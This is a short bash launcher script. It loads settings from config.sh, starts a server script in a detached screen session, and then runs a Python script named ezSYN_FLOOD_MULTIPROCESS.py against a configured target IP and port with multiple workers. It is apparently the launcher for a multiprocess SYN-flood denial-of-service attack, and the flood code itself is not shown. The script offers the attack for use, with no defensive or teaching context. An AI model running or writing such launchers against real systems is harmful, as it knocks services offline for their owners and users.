#!/bin/bash

# ====================================================== #

DIR=$(dirname $0)

source $DIR/config.sh

# ====================================================== #

screen -dmSL bash $DIR/server.sh $SERVER_PORT

python $DIR/ezSYN_FLOOD_MULTIPROCESS.py "$TARGET_IP" "$TARGET_PORT" --workers="$NUM_WORKERS" 

